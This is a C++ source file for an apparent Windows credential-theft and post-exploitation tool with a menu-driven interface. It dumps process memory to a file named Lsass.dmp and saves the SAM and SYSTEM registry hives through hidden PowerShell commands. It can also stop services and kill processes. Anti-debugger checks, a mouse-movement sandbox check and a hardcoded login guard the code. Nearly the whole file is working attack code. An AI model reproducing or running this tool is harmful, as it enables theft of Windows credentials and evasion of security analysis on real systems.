#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>
#include <dbghelp.h>
#include <string>
#define SE_SERVICE_LOGON_NAME L"SeServiceLogonRight"
#pragma comment(lib, "ntdll")
#pragma comment(lib, "dbghelp.lib")

using namespace std;
void BUTcantRUN();
void ManageWindowsService();
BOOL EnablePrivilege(LPCWSTR privilegeName);
void ManageService(const wchar_t* szSvcName, bool start);
VOID __stdcall DoStopSvc(const wchar_t* szSvcName);
BOOL __stdcall StopDependentServices(SC_HANDLE schService);
void GetProcessNameByPid(DWORD pid);
BOOL EnablePrivilege();
bool CreateProcessDump(DWORD pid, const std::string& dumpFilePath);
void EnableBackupPrivilege();
bool IsElevatedProcess();
void HandleProcessManagement();
void TIME(bool& success);
void LOGCHECK(bool& checkinGo);
void CheckDebugger();
void OLLYDBG();
void x64dbg();
void x32dbg();
void ghidraRun();
void ida();
void ida64();


    int main() {
        CheckDebugger();
        MessageBoxA(NULL, "ALERT.", "Info", MB_OK | MB_ICONINFORMATION);
        void OLLYDBG();
        void x64dbg();
        void x32dbg();
        void ghidraRun();
        void ida();
        void ida64();




    /*
           ▀█▀ ▄▀█ █▄░█ ▀█▀ █▀█   █▀█ █▀█ █▀▀ █▄▀ █▀▀ ▀█▀   █▄▀ █▄░█ █ █▀▀ █▀▀
           ░█░ █▀█ █░▀█ ░█░ █▄█   █▀▀ █▄█ █▄▄ █░█ ██▄ ░█░   █░█ █░▀█ █ █▀░ ██▄

 Note!Run as Admin, while dumping important processes or the sam-system file, EDR or antivirus may stop you or the process may not be dumped correctly!.

 注意! 管理者として実行します。重要なプロセスまたは sam-system ファイルをダンプしているときに、EDR またはウイルス対策によって停止したり、プロセスが正しくダンプされない可能性があります。

           */

    bool checkinGo = false;
    LOGCHECK(checkinGo);

    if (checkinGo) {
        while (true) {
            bool success = false;
            TIME(success);
            if (success) {
                int choice = 0;

                cout << "\n" << endl;
                cout << " [1] Dump Process " << endl;
                cout << " [2] Dump SAM and SYSTEM Hives " << endl;
                cout << " [3] service " << endl;
                cout << " [4] List Process " << endl;
                cout << " [5] Process Mangment " << endl;
                cout << " [6] EXIT \n" << endl;





                cout << " [+] Enter your choice: ";
                cin >> choice;
                switch (choice) {
                case 1:
                {
                    Sleep(500);
                    if (!EnablePrivilege()) {
                        cerr << "[-] Failed to enable privilege." << endl;
                        return 1;
                    }
                    else {
                        cout << "[+] Privilege SE_DEBUG_NAME enabled successfully! " << endl;
                    }

                    DWORD pid;
                    cout << "Enter the PID: ";
                    cin >> pid;

                    if (cin.fail()) {
                        cerr << "Invalid input for PID." << endl;
                        return 1;
                    }

                    string dumpFilePath = "C:\\Users\\Public\\Lsass.dmp";
                    Sleep(10000);
                    if (CreateProcessDump(pid, dumpFilePath)) {
                        cout << "[+] Dump created successfully at " << dumpFilePath << endl;
                    }
                    else {
                        cout << "[+] Failed to create dump." << endl;
                    }

                    GetProcessNameByPid(pid);


                    const char* sourcePath = "C:\\Users\\Public\\Lsass.dmp";
                    const char* archivePath = "C:\\Users\\Public\\archive.zip";
                    const char* destinationPath = "C:\\";

                    Sleep(5000);

                    std::string compressCommand = "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Compress-Archive -Path '" + std::string(sourcePath) + "' -DestinationPath '" + std::string(archivePath) + "'\"";
                    int compressResult = system(compressCommand.c_str());

                    Sleep(5000);

                    std::string copyCommand = "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Copy-Item '" + std::string(sourcePath) + "' -Destination '" + std::string(destinationPath) + "'\"";
                    int copyResult = system(copyCommand.c_str());

                    Sleep(5000);

                    if (compressResult == 0) {
                        std::cout << "File compressed successfully." << std::endl;
                    }
                    else {
                        std::cout << "Error compressing file." << std::endl;
                    }

                    if (copyResult == 0) {
                        std::cout << "File copied successfully." << std::endl;
                    }
                    else {
                        std::cout << "Error copying file." << std::endl;
                    }


                    break;

                }

                case 2:
                {

                    EnableBackupPrivilege();
                    Sleep(10000);
                    IsElevatedProcess();
                    Sleep(10000);

                    system("powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"reg save hklm\\sam C:\\Users\\Public\\sam.hive\"");
                    Sleep(5000);
                    system("powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"reg save hklm\\system C:\\Users\\Public\\system.hive\"");
                    Sleep(5000);
                    std::cerr << "Dump sam ...: " << GetLastError() << std::endl;
                    std::cerr << "Dump system.hive ...: " << GetLastError() << std::endl;

                    break;
                }

                case 3:
                {
                    Sleep(5000);
                    ManageWindowsService();
                    Sleep(5000);
                    break;
                }

                case 4:
                {
                    Sleep(500);
                    cout << "[1] TASKLIST \n" << endl;
                    cout << "[2] TASKLIST Process Running NT AUTHORITY\\SYSTEM  \n" << endl;
                    cout << "[*] List Of PROCESSES  \n" << endl;

                    cout << "********************************************************************************* \n" << endl;
                    Sleep(500);
                    system("tasklist");
                    Sleep(15000);

                    cout << "********************************************************************************* \n" << endl;
                    cout << "[*] Proccess Running NT AUTHORITY\\SYSTEM \n" << endl;
                    Sleep(500);
                    system("tasklist /FI \"USERNAME eq NT AUTHORITY\\SYSTEM\"");
                    Sleep(15000);
                    break;
                }
                case 5:
                {
                    if (!EnablePrivilege()) {
                        cerr << "[-] Failed to enable privilege." << endl;
                        return 1;
                    }
                    else {
                        cout << "[+] Privilege SE_DEBUG_NAME enabled successfully! " << endl;
                    }
                    Sleep(5000);

                    HandleProcessManagement();
                    break;

                }

                case 6:
                {
                    cout << "[*] Exiting the program..." << endl;
                    return 0;
                }

                default:
                    cout << "[*] Invalid choice, please enter 1, 2, 3, 4, or 5." << endl;
                }
            }
            else {
                CheckDebugger();
                MessageBoxA(NULL, "ALERT.", "Info", MB_OK | MB_ICONINFORMATION);
                void OLLYDBG();
                void x64dbg();
                void x32dbg();
                void ghidraRun();
                void ida();
                void ida64();

                Sleep(5000);
                cout << "No user activity detected. Please try again." << endl;
            }
        }
    }

    return 0;
}

/*********************************************************************/
void GetProcessNameByPid(DWORD pid) {
    HANDLE hProcess;
    CHAR processName[MAX_PATH] = "<unknown>";

    hProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_READ, FALSE, pid);
    if (hProcess != NULL) {
        if (GetProcessImageFileNameA(hProcess, processName, sizeof(processName))) {
            printf(" [+]Process ID: %u\n", pid);
            printf("[+] Process Image Name: %s\n", processName);
        }
        else {
            printf("[-] Could not retrieve process name. Error: %lu\n", GetLastError());
        }
        CloseHandle(hProcess);
    }
    else {
        printf("[-] Could not open process. Error: %lu\n", GetLastError());
    }
}
/************************************************************************/
BOOL EnablePrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        cerr << "[-] OpenProcessToken failed. Error: " << GetLastError() << endl;
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        cerr << "[-] LookupPrivilegeValue failed. Error: " << GetLastError() << endl;
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        cerr << "[-] AdjustTokenPrivileges failed. Error: " << GetLastError() << endl;
        CloseHandle(hToken);
        return FALSE;
    }

    DWORD dwError = GetLastError();
    if (dwError == ERROR_NOT_ALL_ASSIGNED) {
        cerr << "[-] The token does not have the specified privilege." << endl;
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

/*********************************/
/*********************************/
       //Dump PRocess
/*********************************/
/*********************************/

bool CreateProcessDump(DWORD pid, const std::string& dumpFilePath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        cerr << "[-] Failed to open process: " << GetLastError() << endl;
        return false;
    }

    HANDLE hFile = CreateFileA(dumpFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "[-] Failed to create dump file: " << GetLastError() << endl;
        CloseHandle(hProcess);
        return false;
    }

    MINIDUMP_EXCEPTION_INFORMATION mdei = {};
    mdei.ThreadId = 0;
    mdei.ExceptionPointers = NULL;
    mdei.ClientPointers = FALSE;

    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, (pid == 0) ? NULL : &mdei, NULL, NULL);
    if (!success) {
        cerr << "[-] MiniDumpWriteDump failed (Run as Admin): " << GetLastError() << endl;
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);

    return success == TRUE;
}

/*********************************/
/*********************************/
       //EnableBackupPrivilege
/*********************************/
/*********************************/

void EnableBackupPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        cerr << "[-] OpenProcessToken failed: " << GetLastError() << endl;
        return;
    }

    LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        cerr << "[-] AdjustTokenPrivileges failed: " << GetLastError() << endl;
        CloseHandle(hToken);
        return;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        cerr << "[-] The token does not have the specified privilege." << endl;
    }
    else {
        cout << "[+] SeBackupPrivilege has been successfully enabled." << endl;
    }

    CloseHandle(hToken);
}

/*********************************/
/*********************************/
       //Elevate
/*********************************/
/*********************************/


bool IsElevatedProcess() {
    bool isElevated = false;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            isElevated = elevation.TokenIsElevated;
            if (isElevated) {
                cout << "[+] Process is running with elevated privileges." << endl;
            }
            else {
                cout << "[!] Process is not running with elevated privileges." << endl;
            }
        }
        else {
            cerr << "[-] Failed to get token information. Error: " << GetLastError() << endl;
        }
    }
    else {
        cerr << "[-] Failed to open process token. Error: " << GetLastError() << endl;
    }

    if (token) {
        CloseHandle(token);
    }

    return isElevated;
}

/*********************************/
/*********************************/
         //service
/*********************************/
/*********************************/


BOOL EnablePrivilege(LPCWSTR privilegeName);
VOID __stdcall DoStopSvc(const wchar_t* szSvcName);
void ManageService(const wchar_t* szSvcName, bool start);
BOOL __stdcall StopDependentServices(SC_HANDLE schService);

void ManageWindowsService() {
    wchar_t szSvcName[256];
    wchar_t action[10];

    if (!EnablePrivilege(SE_DEBUG_NAME) || !EnablePrivilege(SE_SERVICE_LOGON_NAME) || !EnablePrivilege(SE_BACKUP_NAME) || !EnablePrivilege(SE_RESTORE_NAME)) {
        std::cerr << "[-] Failed to enable one or more privileges." << std::endl;
        return;
    }
    else {
        std::cout << "[+] Required privileges enabled successfully!" << std::endl;
    }
    std::wcout << L"[?] Enter the name of the service: ";
    std::wcin >> szSvcName;
    std::wcout << L"[?] Do you want to start, stop, pause, or manage service? (start/stop/pause/manage): ";
    std::wcin >> action;

    /*****************************************************/
    /*****************************************************/
    /*****************************************************/
    /*****************************************************/

    if (wcscmp(action, L"start") == 0) {
        ManageService(szSvcName, true);
    }
    else if (wcscmp(action, L"stop") == 0) {
        DoStopSvc(szSvcName);
    }
    else if (wcscmp(action, L"pause") == 0) {
        ManageService(szSvcName, false);
    }
    else if (wcscmp(action, L"manage") == 0) {
        ManageService(szSvcName, true);
    }
    else {
        std::wcerr << L"[-] Invalid action. Please enter 'start', 'stop', 'pause', or 'manage'.\n";
    }
}
    /*****************************************************/
    /*****************************************************/
    /*****************************************************/
    /*****************************************************/
    
    BOOL EnablePrivilege(LPCWSTR privilegeName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "[-] OpenProcessToken failed. Error: " << GetLastError() << std::endl;
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
        std::cerr << "[-] LookupPrivilegeValue failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        std::cerr << "[-] AdjustTokenPrivileges failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }

    DWORD dwError = GetLastError();
    if (dwError == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "[-] The token does not have the specified privilege." << std::endl;
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

    /*****************************************************/
    /*****************************************************/
    /*****************************************************/
    /*****************************************************/


void ManageService(const wchar_t* szSvcName, bool start) {
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        std::wcerr << L"[-] OpenSCManager failed (" << GetLastError() << L")\n";
        return;
    }
    SC_HANDLE schService = OpenService(schSCManager, szSvcName, start ? SERVICE_START : SERVICE_CONTROL_PAUSE);
    if (schService == NULL) {
        std::wcerr << L"[-] OpenService failed (" << GetLastError() << L")\n";
        CloseServiceHandle(schSCManager);
        return;
    }
    if (start) {
        if (StartService(schService, 0, NULL)) {
            std::wcout << L"Service " << szSvcName << L"[+] started successfully.\n";
        }
        else {
            std::wcerr << L"[-] Failed to start service " << szSvcName << L". Error: " << GetLastError() << L"\n";
        }
    }
    else {
        SERVICE_STATUS ss;
        if (ControlService(schService, SERVICE_CONTROL_PAUSE, &ss)) {
            std::wcout << L"Service " << szSvcName << L"[+] paused successfully.\n";
        }
        else {
            std::wcerr << L"[-] Failed to pause service " << szSvcName << L". Error: " << GetLastError() << L"\n";
        }
    }
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

VOID __stdcall DoStopSvc(const wchar_t* szSvcName) {
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
    SC_HANDLE schService = OpenService(schSCManager, szSvcName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS);
    if (schService == NULL) {
        printf("OpenService failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {
        printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
        goto cleanup;
    }

    if (ssp.dwCurrentState == SERVICE_STOPPED) {
        printf("Service is already stopped.\n");
        goto cleanup;
    }
    StopDependentServices(schService);
    if (!ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp)) {
        printf("ControlService failed (%d)\n", GetLastError());
        goto cleanup;
    }    while (ssp.dwCurrentState != SERVICE_STOPPED) {
        Sleep(ssp.dwWaitHint);
        if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
            printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
        if (ssp.dwCurrentState == SERVICE_STOPPED)
            break;
    }
    printf("Service stopped successfully\n");
cleanup:
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

BOOL __stdcall StopDependentServices(SC_HANDLE schService) {
    DWORD i;
    DWORD dwBytesNeeded;
    DWORD dwCount;
    LPENUM_SERVICE_STATUS lpDependencies = NULL;
    ENUM_SERVICE_STATUS ess;
    SC_HANDLE hDepService;
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwStartTime = GetTickCount();
    DWORD dwTimeout = 30000;
    if (EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies, 0, &dwBytesNeeded, &dwCount)) {
        return TRUE;
    }
    else {
        if (GetLastError() != ERROR_MORE_DATA)
            return FALSE;
        lpDependencies = (LPENUM_SERVICE_STATUS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesNeeded);
        if (!lpDependencies) return FALSE;
        __try {
            if (!EnumDependentServices(schService, SERVICE_ACTIVE, lpDependencies, dwBytesNeeded, &dwBytesNeeded, &dwCount))
                return FALSE;
            for (i = 0; i < dwCount; i++) {
                ess = *(lpDependencies + i);
                hDepService = OpenService(OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS), ess.lpServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
                if (!hDepService) return FALSE;
                __try {
                    if (!ControlService(hDepService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
                        return FALSE;
                    while (ssp.dwCurrentState != SERVICE_STOPPED) {
                        Sleep(ssp.dwWaitHint);
                        if (!QueryServiceStatusEx(hDepService,
                            SC_STATUS_PROCESS_INFO,
                            (LPBYTE)&ssp,
                            sizeof(SERVICE_STATUS_PROCESS),
                            &dwBytesNeeded))
                            return FALSE;

                        if (ssp.dwCurrentState == SERVICE_STOPPED)
                            break;
                    }
                }
                __finally {
                    CloseServiceHandle(hDepService);
                }
            }
        }
        __finally {
            HeapFree(GetProcessHeap(), 0, lpDependencies);
        }
    }
    return TRUE;
}

/********************* */

void TIME(bool& success) {
    POINT cursorPos;
    POINT lastPos;
    lastPos.x = -1;
    lastPos.y = -1;
    DWORD lastTime = GetTickCount();
    const DWORD timeout = 1000;
    const DWORD sleepTime = 1000;
    DWORD startTick = GetTickCount();
    const DWORD duration = 5000;
    while (GetTickCount() - startTick < duration) {
        GetCursorPos(&cursorPos);
        if (cursorPos.x != lastPos.x || cursorPos.y != lastPos.y) {
            Beep(0, 0);
            lastPos = cursorPos;
            lastTime = GetTickCount();
            success = true;
        }
        else {
            if (GetTickCount() - lastTime >= timeout) {
                MessageBoxA(NULL, "This program cannot run in DOS mode!", "Error", MB_OK);
                exit(0);
            }
        }
        Sleep(sleepTime);
    }

    return;
}

/************************************************************* */

void LOGCHECK(bool& checkinGo) {
    string username;
    string password;
    const string correctUsername = "Nier";
    const string correctPassword = "AutomaTa9s";

    while (true) {
        cout << "Enter username: ";
        getline(cin, username);

        cout << "Enter password: ";
        getline(cin, password);

        if (username == correctUsername && password == correctPassword) {
            cout << "Login successful!" << endl;
            checkinGo = true;
            break;
        }
        else {
            cout << "Login failed! Incorrect username or password." << endl;
        }
    }
}

/*******************************************************************************/
/*******************************************************************************/
                          // Process 
/*******************************************************************************/
/*******************************************************************************/

void PrintProcessName(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_VM_READ, FALSE, pid);

    if (hProcess) {
        char processName[MAX_PATH] = "<unknown>";

        if (GetModuleFileNameExA(hProcess, NULL, processName, sizeof(processName) / sizeof(char)) == 0) {
            cout << "Unable to retrieve process name." << endl;
        }
        else {
            cout << "Process Found: " << processName << " (PID: " << pid << ")" << endl;
        }

        CloseHandle(hProcess);
    }
    else {
        cout << "Unable to open process with PID " << pid << "." << endl;
    }
}


/*******************************************************************************/

/*******************************************************************************/

bool StopProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

    if (hProcess) {
        if (TerminateProcess(hProcess, 0)) {
            CloseHandle(hProcess);
            return true;
        }
        else {
            CloseHandle(hProcess);
            return false;
        }
    }
    else {
        return false;
    }
}

/*******************************************************************************/

void HandleProcessManagement() {
    DWORD pid;
    cout << "Enter the Process ID (PID): ";
    cin >> pid;

    PrintProcessName(pid);
    cout << "Choose an option:" << endl;
    cout << "[1]: Stop Process" << endl;
    cout << "[2] : Do Nothing :) " << endl;

    int choice;
    cin >> choice;

    if (choice == 1) {
        if (StopProcess(pid)) {
            cout << "Process stopped successfully." << endl;
        }
        else {
            cout << "Failed to stop the process." << endl;
        }
    }
    else {
        cout << "No action taken." << endl;
    }
}


/***************************************************/
/***************************************************/
/***************************************************/
            //Test Debuger 
void CheckDebugger() {
    if (IsDebuggerPresent()) {
        MessageBoxA(NULL, "This program cannot run in DOS mode.", "Error", MB_OK | MB_ICONERROR);
        exit(EXIT_FAILURE);
    }
    else {
        int Raven = 1;
    }
}

void OLLYDBG() {
    HWND hwnd = FindWindowA("OLLYDBG", NULL);
    if (hwnd != NULL) {
        MessageBoxA(NULL, "This program cannot run in DOS mode.", "Error", MB_OK);
        exit(0);
    }
    else {
        int Raven = 1;
    }
}


/***************************************************/
/***************************************************/
/***************************************************/

void x64dbg() {
    HWND hwnd = FindWindowA("x64dbg", NULL);
    if (hwnd != NULL) {
        MessageBoxA(NULL, "This program cannot run in DOS mode.", "Error", MB_OK);
        exit(0);
    }
    else {
        int Raven = 1;
    }
}


/***************************************************/
/***************************************************/
/***************************************************/

void x32dbg() {
    HWND hwnd = FindWindowA("x32dbg", NULL);
    if (hwnd != NULL) {
        MessageBoxA(NULL, "This program cannot run in DOS mode.", "Error", MB_OK);
        exit(0);
    }
    else {
        int Raven = 1;
    }
}


/***************************************************/
/***************************************************/
/***************************************************/

void ghidraRun() {
    HWND hwnd = FindWindowA("ghidraRun", NULL);
    if (hwnd != NULL) {
        MessageBoxA(NULL, "This program cannot run in DOS mode.", "Error", MB_OK);
        exit(0);
    }
    else {
        int Raven = 1;
    }
}


/***************************************************/
/***************************************************/
/***************************************************/

void ida() {
    HWND hwnd = FindWindowA("ida", NULL);
    if (hwnd != NULL) {
        MessageBoxA(NULL, "This program cannot run in DOS mode.", "Error", MB_OK);
        exit(0);
    }
    else {
        int Raven = 1;
    }
}

/***************************************************/
/***************************************************/
/***************************************************/

void ida64() {
    HWND hwnd = FindWindowA("ida64", NULL);
    if (hwnd != NULL) {
        MessageBoxA(NULL, "This program cannot run in DOS mode.", "Error", MB_OK);
        exit(0);
    }
    else {
        int Raven = 1;
    }
}